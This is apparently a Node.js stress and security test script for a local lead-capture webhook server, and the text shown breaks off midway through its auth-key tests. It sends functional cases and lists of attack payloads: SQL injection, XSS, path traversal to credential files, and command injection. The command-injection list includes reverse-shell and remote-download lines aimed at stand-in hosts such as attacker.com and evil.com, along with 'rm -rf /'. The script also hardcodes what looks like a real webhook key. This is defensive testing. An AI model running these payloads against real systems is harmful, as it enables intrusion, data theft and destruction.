#!/usr/bin/env node
/**
 * Comprehensive 1000-position stress test & security simulation
 * for the RB2B/Leadpipe webhook server at http://localhost:9100
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const BASE_URL = 'http://localhost:9100';
const AUTH_KEY = 'T5v9hc5rP64wwhNE0FKsUNYj2p3l-FfH';
const ENDPOINT = `/rb2b/webhook?key=${AUTH_KEY}`;
const REPORT_PATH = path.join(__dirname, 'STRESS_TEST_REPORT.md');

// Results tracking
const results = {
  total: 0,
  passed: 0,
  failed: 0,
  errors: 0,
  crashed: 0,
  categories: {},
  vulnerabilities: [],
  crashScenarios: [],
  unexpectedBehaviors: [],
  log: [],
};

function addResult(category, testName, expected, actual, passed, notes = '') {
  results.total++;
  if (passed) results.passed++;
  else results.failed++;
  
  if (!results.categories[category]) results.categories[category] = { passed: 0, failed: 0, total: 0 };
  results.categories[category].total++;
  if (passed) results.categories[category].passed++;
  else results.categories[category].failed++;
  
  results.log.push({ id: results.total, category, testName, expected, actual, passed, notes });
  
  if (!passed && notes) {
    results.unexpectedBehaviors.push({ id: results.total, testName, notes });
  }
}

function makeRequest(options) {
  return new Promise((resolve) => {
    const startTime = Date.now();
    const timeout = options.timeout || 10000;
    
    const reqOptions = {
      hostname: 'localhost',
      port: 9100,
      path: options.path || ENDPOINT,
      method: options.method || 'POST',
      headers: options.headers || { 'Content-Type': 'application/json' },
    };

    try {
      const req = http.request(reqOptions, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body: body.substring(0, 2000),
            elapsed: Date.now() - startTime,
          });
        });
      });

      req.on('error', (err) => {
        resolve({ statusCode: 0, body: err.message, elapsed: Date.now() - startTime, error: true });
      });

      req.setTimeout(timeout, () => {
        req.destroy();
        resolve({ statusCode: 0, body: 'TIMEOUT', elapsed: Date.now() - startTime, error: true });
      });

      if (options.body !== undefined) {
        const data = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
        req.write(data);
      }
      req.end();
    } catch (err) {
      resolve({ statusCode: 0, body: `REQUEST_ERROR: ${err.message}`, elapsed: Date.now() - startTime, error: true });
    }
  });
}

function validPayload(overrides = {}) {
  return {
    'First Name': 'John',
    'Last Name': 'Smith',
    'Title': 'Managing Partner',
    'Company Name': 'Smith & Associates Law Firm',
    'Industry': 'Legal Services',
    'Business Email': 'john@smithlaw.com',
    'LinkedIn URL': 'https://linkedin.com/in/johnsmith',
    'Captured URL': 'https://example.com/pricing',
    'City': 'Houston',
    'State': 'TX',
    'Employee Count': '11-50',
    'Estimate Revenue': '$1M-$5M',
    'Referrer': 'https://google.com',
    'Repeat Visitor': false,
    ...overrides,
  };
}

// ==================== FUNCTIONAL TESTS (400) ====================

async function functionalTests() {
  const cat = 'Functional';
  console.log('\n🧪 Running Functional Tests...');

  // --- 1. Valid payloads with field combinations (100 tests) ---
  const fieldCombinations = [
    { desc: 'Full valid payload - attorney', overrides: {} },
    { desc: 'Full valid - CEO', overrides: { 'Title': 'CEO', 'Company Name': 'Legal Corp' } },
    { desc: 'Full valid - Partner', overrides: { 'Title': 'Senior Partner' } },
    { desc: 'Full valid - Owner', overrides: { 'Title': 'Owner', 'Industry': 'Law Practice' } },
    { desc: 'Full valid - VP', overrides: { 'Title': 'VP of Business Development' } },
    { desc: 'Only name fields', overrides: { 'First Name': 'Jane', 'Last Name': 'Doe' } },
    { desc: 'Name + Title only', overrides: { 'Title': 'Lawyer', 'Business Email': undefined } },
    { desc: 'All fields populated', overrides: { 'Phone': '555-1234', 'Country': 'US' } },
    { desc: 'Gmail email (non-business)', overrides: { 'Business Email': 'john@gmail.com' } },
    { desc: 'Yahoo email', overrides: { 'Business Email': 'john@yahoo.com' } },
    { desc: 'Hotmail email', overrides: { 'Business Email': 'john@hotmail.com' } },
    { desc: 'High-intent pricing page', overrides: { 'Captured URL': 'https://site.com/pricing' } },
    { desc: 'High-intent contact page', overrides: { 'Captured URL': 'https://site.com/contact' } },
    { desc: 'High-intent demo page', overrides: { 'Captured URL': 'https://site.com/demo' } },
    { desc: 'High-intent start page', overrides: { 'Captured URL': 'https://site.com/start' } },
    { desc: 'Blog page (low intent)', overrides: { 'Captured URL': 'https://site.com/blog/post1' } },
    { desc: 'Homepage only', overrides: { 'Captured URL': 'https://site.com/' } },
    { desc: 'No LinkedIn', overrides: { 'LinkedIn URL': '' } },
    { desc: 'No LinkedIn (null)', overrides: { 'LinkedIn URL': null } },
    { desc: 'Employee 11-50', overrides: { 'Employee Count': '11-50' } },
    { desc: 'Employee 51-200', overrides: { 'Employee Count': '51-200' } },
    { desc: 'Employee 201-500', overrides: { 'Employee Count': '201-500' } },
    { desc: 'Employee 1-10', overrides: { 'Employee Count': '1-10' } },
    { desc: 'Employee 500+', overrides: { 'Employee Count': '500+' } },
    { desc: 'Direct referrer', overrides: { 'Referrer': '' } },
    { desc: 'Google referrer', overrides: { 'Referrer': 'https://google.com' } },
    { desc: 'Facebook referrer', overrides: { 'Referrer': 'https://facebook.com' } },
    { desc: 'Insurance industry', overrides: { 'Industry': 'Insurance' } },
    { desc: 'Personal injury', overrides: { 'Industry': 'Personal Injury Law' } },
    { desc: 'Non-legal industry', overrides: { 'Industry': 'Technology', 'Title': 'Software Engineer' } },
    { desc: 'Litigation industry', overrides: { 'Industry': 'Litigation' } },
    { desc: 'Trial attorney', overrides: { 'Title': 'Trial Attorney' } },
    { desc: 'Paralegal', overrides: { 'Title': 'Paralegal' } },
    { desc: 'Of counsel', overrides: { 'Title': 'Of Counsel' } },
    { desc: 'Director of operations', overrides: { 'Title': 'Director of Operations' } },
    { desc: 'Head of marketing', overrides: { 'Title': 'Head of Marketing' } },
    { desc: 'Chief legal officer', overrides: { 'Title': 'Chief Legal Officer' } },
  ];

  // Generate more combinations to reach ~100
  const names = ['Alice', 'Bob', 'Carlos', 'Diana', 'Ethan', 'Fiona', 'George', 'Hannah', 'Ivan', 'Julia'];
  const lastNames = ['Anderson', 'Brown', 'Chen', 'Davis', 'Evans', 'Foster', 'Garcia', 'Hill', 'Ito', 'Jones'];
  const titles = ['Attorney', 'Lawyer', 'Partner', 'Associate', 'Counsel', 'Director', 'President', 'CEO', 'Owner', 'VP'];
  const industries = ['Legal', 'Law', 'Insurance', 'Technology', 'Healthcare', 'Finance', 'Real Estate', 'Consulting', 'Marketing', 'Retail'];
  
  for (let i = 0; i < 63; i++) {
    fieldCombinations.push({
      desc: `Combo variant #${i + 38}`,
      overrides: {
        'First Name': names[i % names.length],
        'Last Name': lastNames[i % lastNames.length],
        'Title': titles[i % titles.length],
        'Industry': industries[i % industries.length],
        'Business Email': `${names[i % names.length].toLowerCase()}@firm${i}.com`,
      }
    });
  }

  for (const combo of fieldCombinations) {
    const payload = validPayload(combo.overrides);
    const res = await makeRequest({ body: payload });
    const passed = res.statusCode === 200;
    addResult(cat, combo.desc, 'status 200', `status ${res.statusCode}`, passed, !passed ? res.body : '');
  }

  // --- 2. Missing required fields (50 tests) ---
  const requiredFields = ['First Name', 'Last Name', 'Title', 'Company Name', 'Industry', 
                          'Business Email', 'Captured URL', 'City', 'State'];
  
  for (const field of requiredFields) {
    const payload = validPayload();
    delete payload[field];
    const res = await makeRequest({ body: payload });
    const passed = res.statusCode === 200; // Server accepts partial data
    addResult(cat, `Missing field: ${field}`, 'status 200 (graceful)', `status ${res.statusCode}`, passed);
  }

  // Missing multiple fields
  for (let i = 0; i < 10; i++) {
    const payload = validPayload();
    const fieldsToRemove = requiredFields.slice(0, i + 1);
    for (const f of fieldsToRemove) delete payload[f];
    const res = await makeRequest({ body: payload });
    addResult(cat, `Missing ${i + 1} fields`, 'status 200 (graceful)', `status ${res.statusCode}`, res.statusCode === 200);
  }

  // All fields missing (empty object)
  for (let i = 0; i < 5; i++) {
    const res = await makeRequest({ body: {} });
    addResult(cat, `Empty object #${i + 1}`, 'status 200', `status ${res.statusCode}`, res.statusCode === 200);
  }

  // --- 3. Empty/null payloads (30 tests) ---
  const nullTests = [
    { desc: 'Null body string', body: 'null' },
    { desc: 'Empty string body', body: '' },
    { desc: 'Undefined string', body: 'undefined' },
    { desc: 'Just whitespace', body: '   ' },
    { desc: 'Array instead of object', body: '[]' },
    { desc: 'Array with object', body: '[{}]' },
    { desc: 'Number body', body: '42' },
    { desc: 'Boolean body', body: 'true' },
    { desc: 'False body', body: 'false' },
    { desc: 'Zero body', body: '0' },
  ];
  
  for (const t of nullTests) {
    const res = await makeRequest({ body: t.body });
    addResult(cat, t.desc, 'status 200 (parse_error)', `status ${res.statusCode}, body: ${res.body.substring(0, 100)}`, res.statusCode === 200);
  }

  // Null values in fields
  for (const field of requiredFields.slice(0, 9)) {
    const payload = validPayload({ [field]: null });
    const res = await makeRequest({ body: payload });
    addResult(cat, `Null value: ${field}`, 'status 200', `status ${res.statusCode}`, res.statusCode === 200,
      res.statusCode !== 200 ? `Crashed on null ${field}` : '');
  }

  // Undefined-like values
  for (const field of ['Title', 'Company Name', 'Industry']) {
    for (const val of [0, false, NaN]) {
      const payload = validPayload({ [field]: val });
      const res = await makeRequest({ body: payload });
      const note = res.error ? `ERROR: ${res.body}` : '';
      addResult(cat, `${field} = ${val}`, 'status 200', `status ${res.statusCode}`, res.statusCode === 200, note);
    }
  }

  // --- 4. Extremely long strings (30 tests) ---
  const longStr10k = 'A'.repeat(10000);
  const longStr100k = 'B'.repeat(100000);
  const longStr1m = 'C'.repeat(1000000);
  
  const longStringFields = ['First Name', 'Last Name', 'Title', 'Company Name', 'Industry', 
                             'Business Email', 'LinkedIn URL', 'Captured URL', 'City', 'State'];
  
  for (const field of longStringFields) {
    const res = await makeRequest({ body: validPayload({ [field]: longStr10k }) });
    addResult(cat, `10K chars in ${field}`, 'status 200', `status ${res.statusCode}, ${res.elapsed}ms`, res.statusCode === 200,
      res.elapsed > 5000 ? `SLOW: ${res.elapsed}ms` : '');
  }

  for (const field of ['First Name', 'Title', 'Company Name', 'Industry', 'Captured URL']) {
    const res = await makeRequest({ body: validPayload({ [field]: longStr100k }) });
    addResult(cat, `100K chars in ${field}`, 'status 200', `status ${res.statusCode}, ${res.elapsed}ms`, res.statusCode === 200,
      res.elapsed > 5000 ? `SLOW: ${res.elapsed}ms` : '');
  }

  // 1MB field values
  for (const field of ['Title', 'First Name', 'Captured URL']) {
    const res = await makeRequest({ body: validPayload({ [field]: longStr1m }), timeout: 30000 });
    addResult(cat, `1MB chars in ${field}`, 'status 200 (should reject?)', `status ${res.statusCode}, ${res.elapsed}ms`, 
      res.statusCode === 200, res.elapsed > 5000 ? `SLOW: ${res.elapsed}ms - possible DoS vector` : '');
  }

  // --- 5. Unicode, emoji, special characters (30 tests) ---
  const unicodeTests = [
    { desc: 'Chinese name', overrides: { 'First Name': '张', 'Last Name': '伟' } },
    { desc: 'Japanese name', overrides: { 'First Name': '太郎', 'Last Name': '山田' } },
    { desc: 'Korean name', overrides: { 'First Name': '민수', 'Last Name': '김' } },
    { desc: 'Arabic name', overrides: { 'First Name': 'محمد', 'Last Name': 'أحمد' } },
    { desc: 'Hindi name', overrides: { 'First Name': 'राज', 'Last Name': 'शर्मा' } },
    { desc: 'Emoji name', overrides: { 'First Name': '🔥 John', 'Last Name': 'Smith 🚀' } },
    { desc: 'Emoji in title', overrides: { 'Title': '💼 CEO 🏆' } },
    { desc: 'Emoji in company', overrides: { 'Company Name': '🏛️ Law Firm LLC' } },
    { desc: 'Special chars in name', overrides: { 'First Name': "O'Brien", 'Last Name': 'McDonald-Smith' } },
    { desc: 'Accented chars', overrides: { 'First Name': 'José', 'Last Name': 'García-López' } },
    { desc: 'German umlauts', overrides: { 'First Name': 'Müller', 'Last Name': 'Böhm' } },
    { desc: 'French accents', overrides: { 'First Name': 'François', 'Last Name': 'Côté' } },
    { desc: 'Null bytes in name', overrides: { 'First Name': 'John\x00Evil', 'Last Name': 'Smith' } },
    { desc: 'Tab/newline in name', overrides: { 'First Name': 'John\t\n', 'Last Name': 'Smith' } },
    { desc: 'Backslash in name', overrides: { 'First Name': 'John\\Smith' } },
    { desc: 'Quote in name', overrides: { 'First Name': 'John "Johnny"', 'Last Name': "O'Brien" } },
    { desc: 'Zero-width chars', overrides: { 'First Name': 'J\u200Bo\u200Bh\u200Bn' } },
    { desc: 'RTL override', overrides: { 'First Name': '\u202EJohn' } },
    { desc: 'Combining chars', overrides: { 'First Name': 'Joh\u0300n' } },
    { desc: 'Surrogate pairs', overrides: { 'First Name': '𝕵𝖔𝖍𝖓' } },
    { desc: 'Mixed scripts', overrides: { 'First Name': 'Jоhn', 'Last Name': 'Ꮪmith' } },  // Cyrillic o, Cherokee S
    { desc: 'Zalgo text', overrides: { 'First Name': 'J̷̧̛o̸̢̕h̵̛̗n̸̡' } },
    { desc: 'All emoji title', overrides: { 'Title': '👨‍⚖️👩‍💼🏢' } },
    { desc: 'URL in name', overrides: { 'First Name': 'https://evil.com' } },
    { desc: 'HTML in name', overrides: { 'First Name': '<b>John</b>' } },
    { desc: 'Very long unicode', overrides: { 'First Name': '🔥'.repeat(1000) } },
    { desc: 'Newlines everywhere', overrides: { 'First Name': 'Line1\nLine2\nLine3', 'Title': 'CEO\r\nOf\r\nEverything' } },
    { desc: 'Control characters', overrides: { 'First Name': '\x01\x02\x03\x04\x05' } },
    { desc: 'Unicode escapes', overrides: { 'First Name': '\\u0041\\u0042' } },
    { desc: 'Emoji flag sequence', overrides: { 'State': '🇺🇸', 'City': '🏙️' } },
  ];

  for (const t of unicodeTests) {
    const res = await makeRequest({ body: validPayload(t.overrides) });
    addResult(cat, t.desc, 'status 200', `status ${res.statusCode}`, res.statusCode === 200,
      res.error ? `Error: ${res.body}` : '');
  }

  // --- 6. Duplicate submissions (30 tests) ---
  const duplicatePerson = validPayload({
    'First Name': 'DuplicateTest',
    'Last Name': 'Person',
    'Business Email': 'duplicate@test.com',
  });
  
  for (let i = 0; i < 15; i++) {
    const res = await makeRequest({ body: duplicatePerson });
    addResult(cat, `Duplicate submission #${i + 1}`, 'status 200 (no dedup)', `status ${res.statusCode}`, res.statusCode === 200,
      'Server has no deduplication - each submission logged separately');
  }

  // Same person, different pages
  for (let i = 0; i < 15; i++) {
    const pages = ['/pricing', '/about', '/contact', '/blog', '/services', '/demo', '/team', '/careers', 
                   '/faq', '/resources', '/case-studies', '/testimonials', '/partners', '/support', '/home'];
    const res = await makeRequest({ body: validPayload({ 
      ...duplicatePerson, 
      'Captured URL': `https://example.com${pages[i]}` 
    }) });
    addResult(cat, `Same person, page: ${pages[i]}`, 'status 200', `status ${res.statusCode}`, res.statusCode === 200);
  }

  // --- 7. Score edge cases (50 tests) ---
  // Exactly at threshold
  const scoreTests = [
    { desc: 'Score exactly 40 (title match + business email)', overrides: { 'Title': 'Attorney', 'Industry': 'Technology', 'Business Email': 'a@firm.com', 'LinkedIn URL': '', 'Captured URL': 'https://site.com/about', 'Employee Count': '1-10' } },
    { desc: 'Score 35 (title match + LinkedIn)', overrides: { 'Title': 'Lawyer', 'Industry': 'Tech', 'Business Email': 'a@gmail.com', 'LinkedIn URL': 'https://linkedin.com/in/x', 'Captured URL': '/about', 'Employee Count': '1' } },
    { desc: 'Score 30 (title only)', overrides: { 'Title': 'Partner', 'Industry': 'Tech', 'Business Email': 'a@gmail.com', 'LinkedIn URL': '', 'Captured URL': '/about', 'Employee Count': '1' } },
    { desc: 'Score 0 (no matches)', overrides: { 'Title': 'Gardener', 'Industry': 'Agriculture', 'Company Name': 'Farm Co', 'Business Email': 'a@gmail.com', 'LinkedIn URL': '', 'Captured URL': '/home', 'Employee Count': '1' } },
    { desc: 'Score negative (excluded student)', overrides: { 'Title': 'Student Intern', 'Industry': 'Tech' } },
    { desc: 'Max score (all bonuses)', overrides: { 'Title': 'Managing Partner', 'Industry': 'Law Practice', 'Company Name': 'Legal LLC', 'Business Email': 'a@firm.com', 'LinkedIn URL': 'https://linkedin.com/in/x', 'Captured URL': 'https://site.com/pricing', 'Employee Count': '51-200' } },
    { desc: 'Excluded + legal industry', overrides: { 'Title': 'Retired Attorney', 'Industry': 'Legal' } },
    { desc: 'Student in legal', overrides: { 'Title': 'Law Student', 'Industry': 'Legal Services' } },
    { desc: 'Intern at law firm', overrides: { 'Title': 'Summer Intern', 'Company Name': 'Big Law Firm', 'Industry': 'Legal' } },
    { desc: 'Title AND excluded (both match)', overrides: { 'Title': 'Student Attorney' } },
  ];

  // Additional score edge cases
  for (let i = 0; i < 40; i++) {
    const titlePool = ['Manager', 'Analyst', 'Secretary', 'Clerk', 'Nurse', 'Doctor', 'Teacher', 'Engineer',
                       'Consultant', 'Advisor', 'Accountant', 'Janitor', 'Driver', 'Cook', 'Artist',
                       'Attorney at Law', 'Senior Counsel', 'Associate Attorney', 'Legal Assistant', 'Partner (Retired)',
                       'Junior Partner', 'Head of Legal', 'Chief Counsel', 'VP Legal Affairs', 'Director of Legal',
                       'Owner', 'President', 'Founding Partner', 'Managing Partner Emeritus', 'Legal Intern',
                       '', ' ', 'N/A', 'Unknown', 'Other', 'Self-Employed', 'Freelance', 'Contract', 'Temp', 'Volunteer'];
    scoreTests.push({
      desc: `Score test - Title: "${titlePool[i]}"`,
      overrides: { 'Title': titlePool[i], 'Industry': i % 2 === 0 ? 'Legal' : 'Technology' },
    });
  }

  for (const t of scoreTests) {
    const res = await makeRequest({ body: validPayload(t.overrides) });
    let parsed;
    try { parsed = JSON.parse(res.body); } catch { parsed = {}; }
    addResult(cat, t.desc, 'status 200 with score', 
      `status ${res.statusCode}, score: ${parsed.score}, qualified: ${parsed.qualified}`,
      res.statusCode === 200, `Score: ${parsed.score}`);
  }

  console.log(`  ✅ Functional: ${results.categories[cat]?.passed || 0}/${results.categories[cat]?.total || 0} passed`);
}

// ==================== SECURITY TESTS (300) ====================

async function securityTests() {
  const cat = 'Security';
  console.log('\n🔒 Running Security Tests...');

  // --- 1. SQL Injection (40 tests) ---
  const sqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE visitors;--",
    "1; DELETE FROM users WHERE 1=1",
    "' UNION SELECT * FROM users--",
    "admin'--",
    "' OR 1=1--",
    "'; INSERT INTO users VALUES('hacked','hacked');--",
    "1' ORDER BY 1--+",
    "1' UNION SELECT null,null,null--",
    "' AND '1'='1",
    "\" OR \"\"=\"",
    "' OR ''='",
    "'; EXEC xp_cmdshell('whoami');--",
    "1; WAITFOR DELAY '0:0:5'--",
    "'; SHUTDOWN;--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' HAVING 1=1--",
    "' GROUP BY columnname HAVING 1=1--",
    "admin' AND '1'='1",
  ];

  const sqlFields = ['First Name', 'Last Name', 'Title', 'Company Name', 'Industry', 'Business Email', 
                     'City', 'State', 'Captured URL', 'Referrer'];

  for (let i = 0; i < 40; i++) {
    const field = sqlFields[i % sqlFields.length];
    const payload = sqlPayloads[i % sqlPayloads.length];
    const res = await makeRequest({ body: validPayload({ [field]: payload }) });
    const isVuln = res.statusCode === 200 && !res.body.includes('error');
    addResult(cat, `SQLi in ${field}: ${payload.substring(0, 30)}`, 'status 200 (no DB so safe)', 
      `status ${res.statusCode}`, res.statusCode === 200,
      'No SQL DB in use - injection stored as plain text in log files');
  }

  // --- 2. XSS Payloads (40 tests) ---
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(document.cookie)</script>',
    "javascript:alert('XSS')",
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details ontoggle=alert(1) open>',
    '<a href="javascript:alert(1)">click</a>',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<div style="background:url(javascript:alert(1))">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    "'-alert(1)-'",
    '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"',
  ];

  for (let i = 0; i < 40; i++) {
    const field = sqlFields[i % sqlFields.length];
    const payload = xssPayloads[i % xssPayloads.length];
    const res = await makeRequest({ body: validPayload({ [field]: payload }) });
    addResult(cat, `XSS in ${field}: ${payload.substring(0, 40)}`, 'status 200 (stored but not rendered)',
      `status ${res.statusCode}`, res.statusCode === 200,
      'XSS stored in log files - potential stored XSS if logs viewed in browser');
    if (res.statusCode === 200) {
      results.vulnerabilities.push({
        type: 'Stored XSS (Low Risk)',
        detail: `XSS payload stored in log file via ${field}: ${payload.substring(0, 50)}`,
        severity: 'Low',
        note: 'Log files are JSONL - XSS would only trigger if logs are rendered as HTML',
      });
    }
  }

  // --- 3. Command Injection (30 tests) ---
  const cmdPayloads = [
    '; ls -la',
    '| cat /etc/passwd',
    '`whoami`',
    '$(cat /etc/passwd)',
    '; rm -rf /',
    '| nc attacker.com 4444 -e /bin/sh',
    '& ping -c 10 attacker.com',
    '\nwhoami',
    '|| curl http://attacker.com/shell.sh | bash',
    '; echo "hacked" > /tmp/pwned',
    '`id`',
    '$(id)',
    '|id',
    ';id',
    '&&id',
    '%0aid',
    '$(sleep 5)',
    '`sleep 5`',
    '; cat /etc/shadow',
    '| wget http://evil.com/backdoor -O /tmp/bd',
    '${{<%[%\'"}}%\\.',
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    '<%= 7*7 %>',
    '{{config}}',
    '{{self.__class__.__mro__}}',
    '${T(java.lang.Runtime).getRuntime().exec("whoami")}',
    '__import__("os").system("whoami")',
    'require("child_process").execSync("whoami")',
  ];

  for (let i = 0; i < 30; i++) {
    const payload = cmdPayloads[i];
    const res = await makeRequest({ body: validPayload({ 'First Name': payload }) });
    addResult(cat, `CmdInj: ${payload.substring(0, 40)}`, 'status 200 (no shell exec)', 
      `status ${res.statusCode}`, res.statusCode === 200,
      'No shell execution in code path - safe');
  }

  // --- 4. Path Traversal (20 tests) ---
  const pathPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '/etc/passwd',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc/passwd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
    '/proc/self/environ',
    '/dev/null',
    'file:///etc/passwd',
    '\\\\attacker.com\\share\\payload',
    '/home/ec2-user/.ssh/id_rsa',
    '../../../../home/ec2-user/clawd/.env.local',
    '/var/log/syslog',
    'C:\\Windows\\System32\\cmd.exe',
    '%00/etc/passwd',
    '../logs/qualified-leads.jsonl',
    '../server.js',
    '../../../proc/self/cmdline',
    '/home/ec2-user/clawd/services/rb2b-webhook/logs/../../../.env.local',
  ];

  for (const payload of pathPayloads) {
    const res = await makeRequest({ body: validPayload({ 'Captured URL': payload, 'LinkedIn URL': payload }) });
    addResult(cat, `PathTraversal: ${payload.substring(0, 50)}`, 'status 200 (no file read)', 
      `status ${res.statusCode}`, res.statusCode === 200,
      'Values stored as data, not used in file operations');
  }

  // --- 5. JSON Bombs / Deeply Nested (20 tests) ---
  // Deeply nested object
  let nested = { a: 'value' };
  for (let i = 0; i < 100; i++) nested = { a: nested };
  
  const res1 = await makeRequest({ body: nested, timeout: 15000 });
  addResult(cat, 'Deeply nested object (100 levels)', 'status 200', `status ${res1.statusCode}, ${res1.elapsed}ms`,
    res1.statusCode === 200);

  // Very deeply nested
  let veryNested = { a: 'value' };
  for (let i = 0; i < 1000; i++) veryNested = { a: veryNested };
  
  const res2 = await makeRequest({ body: JSON.stringify(veryNested), timeout: 15000 });
  addResult(cat, 'Deeply nested object (1000 levels)', 'status 200', `status ${res2.statusCode}, ${res2.elapsed}ms`,
    !res2.error, res2.error ? `Potential crash: ${res2.body}` : '');

  // Large array
  const bigArray = { 'First Name': new Array(100000).fill('x') };
  const res3 = await makeRequest({ body: bigArray, timeout: 15000 });
  addResult(cat, 'Array with 100K elements', 'status 200', `status ${res3.statusCode}, ${res3.elapsed}ms`,
    res3.statusCode === 200, res3.elapsed > 5000 ? `SLOW: ${res3.elapsed}ms` : '');

  // Repeated key attack
  let repeatedKeys = '{';
  for (let i = 0; i < 10000; i++) repeatedKeys += `"key${i}":"value${i}",`;
  repeatedKeys += '"last":"value"}';
  const res4 = await makeRequest({ body: repeatedKeys, timeout: 15000 });
  addResult(cat, '10K unique keys in payload', 'status 200', `status ${res4.statusCode}, ${res4.elapsed}ms`,
    res4.statusCode === 200, res4.elapsed > 5000 ? `SLOW: ${res4.elapsed}ms` : '');

  // Hash collision attack style
  let hashCollision = '{';
  for (let i = 0; i < 1000; i++) hashCollision += `"${'a'.repeat(i)}":"v",`;
  hashCollision = hashCollision.slice(0, -1) + '}';
  const res5 = await makeRequest({ body: hashCollision, timeout: 15000 });
  addResult(cat, 'Hash-like collision keys', 'status 200', `status ${res5.statusCode}, ${res5.elapsed}ms`,
    res5.statusCode === 200);

  // Additional nested/bomb variations (15 more)
  for (let depth = 10; depth <= 150; depth += 10) {
    let obj = { val: 'x' };
    for (let i = 0; i < depth; i++) obj = { n: obj };
    const r = await makeRequest({ body: obj, timeout: 10000 });
    addResult(cat, `Nesting depth ${depth}`, 'status 200', `status ${r.statusCode}`, !r.error);
  }

  // --- 6. Oversized Payloads (10 tests) ---
  const sizes = [
    { name: '100KB payload', size: 100 * 1024 },
    { name: '500KB payload', size: 500 * 1024 },
    { name: '1MB payload', size: 1024 * 1024 },
    { name: '2MB payload', size: 2 * 1024 * 1024 },
    { name: '5MB payload', size: 5 * 1024 * 1024 },
  ];

  for (const s of sizes) {
    const bigPayload = JSON.stringify(validPayload({ 'Notes': 'X'.repeat(s.size) }));
    const res = await makeRequest({ body: bigPayload, timeout: 30000 });
    addResult(cat, s.name, 'should reject or handle', `status ${res.statusCode}, ${res.elapsed}ms`,
      !res.error, res.elapsed > 10000 ? `VERY SLOW: ${res.elapsed}ms - DoS risk` : '');
    if (res.statusCode === 200 && s.size >= 1024 * 1024) {
      results.vulnerabilities.push({
        type: 'No Payload Size Limit',
        detail: `${s.name} accepted without rejection - potential DoS`,
        severity: 'High',
      });
    }
  }

  // Duplicate the oversized tests for more data points
  for (const s of sizes) {
    const bigPayload = JSON.stringify(validPayload({ 'Data': 'Y'.repeat(s.size) }));
    const res = await makeRequest({ body: bigPayload, timeout: 30000 });
    addResult(cat, `${s.name} (repeat)`, 'should reject', `status ${res.statusCode}, ${res.elapsed}ms`, !res.error);
  }

  // --- 7. Malformed JSON (20 tests) ---
  const malformedJsonTests = [
    { desc: 'Truncated JSON', body: '{"First Name": "John"' },
    { desc: 'Extra comma', body: '{"First Name": "John",}' },
    { desc: 'Single quotes', body: "{'First Name': 'John'}" },
    { desc: 'No quotes on keys', body: '{First Name: "John"}' },
    { desc: 'Double colons', body: '{"First Name":: "John"}' },
    { desc: 'Trailing garbage', body: '{"First Name": "John"}GARBAGE' },
    { desc: 'Leading garbage', body: 'GARBAGE{"First Name": "John"}' },
    { desc: 'BOM character', body: '\uFEFF{"First Name": "John"}' },
    { desc: 'Null character in JSON', body: '{"First Name": "Jo\x00hn"}' },
    { desc: 'Just braces', body: '}{' },
    { desc: 'Just brackets', body: '][' },
    { desc: 'XML instead of JSON', body: '<visitor><name>John</name></visitor>' },
    { desc: 'URL encoded', body: 'First+Name=John&Last+Name=Smith' },
    { desc: 'Multipart-like', body: '--boundary\r\nContent-Disposition: form-data; name="test"\r\n\r\nvalue\r\n--boundary--' },
    { desc: 'CSV data', body: 'First Name,Last Name\nJohn,Smith' },
    { desc: 'Binary-like data', body: Buffer.from([0x89, 0x50, 0x4E, 0x47]).toString() },
    { desc: 'Extremely long key', body: `{"${'A'.repeat(10000)}": "value"}` },
    { desc: 'NaN value', body: '{"score": NaN}' },
    { desc: 'Infinity value', body: '{"score": Infinity}' },
    { desc: 'Comments in JSON', body: '{"name": "John" /* comment */}' },
  ];

  for (const t of malformedJsonTests) {
    const res = await makeRequest({ body: t.body });
    addResult(cat, `Malformed: ${t.desc}`, 'status 200 with parse_error', 
      `status ${res.statusCode}, body: ${res.body.substring(0, 80)}`,
      res.statusCode === 200, res.body.includes('parse_error') ? '' : 'Unexpected response for malformed JSON');
  }

  // --- 8. Wrong Content Types (15 tests) ---
  const contentTypes = [
    'text/plain',
    'text/html',
    'application/xml',
    'multipart/form-data',
    'application/x-www-form-urlencoded',
    'application/octet-stream',
    'image/png',
    'text/csv',
    '',
    'application/json; charset=utf-16',
    'application/json; charset=ascii',
    'APPLICATION/JSON',
    'application/JSON',
    'text/json',
    'application/vnd.api+json',
  ];

  for (const ct of contentTypes) {
    const headers = ct ? { 'Content-Type': ct } : {};
    const res = await makeRequest({ body: JSON.stringify(validPayload()), headers });
    addResult(cat, `Content-Type: ${ct || '(none)'}`, 'status 200 (no CT validation)',
      `status ${res.statusCode}`, res.statusCode === 200,
      'Server does not validate Content-Type header');
  }
  if (true) {
    results.vulnerabilities.push({
      type: 'No Content-Type Validation',
      detail: 'Server accepts any Content-Type header without validation',
      severity: 'Low',
    });
  }

  // --- 9. Auth Key Tests (40 tests) ---
  const authTests = [
    { desc: 'No key parameter', path: '/rb2b/webhook' },
    { desc: 'Empty key', path: '/rb2b/webhook?key=' },
    { desc: 'Wrong key', path: '/rb2b/webhook?key=wrong' },
    { desc: 'Partial key (first half)', path: `/rb2b/webhook?key=${AUTH_KEY.substring(0, AUTH_KEY.length / 2)}` },
    { desc: 'Key with extra chars', path: `/rb2b/webhook?key=${AUTH_KEY}extra` },
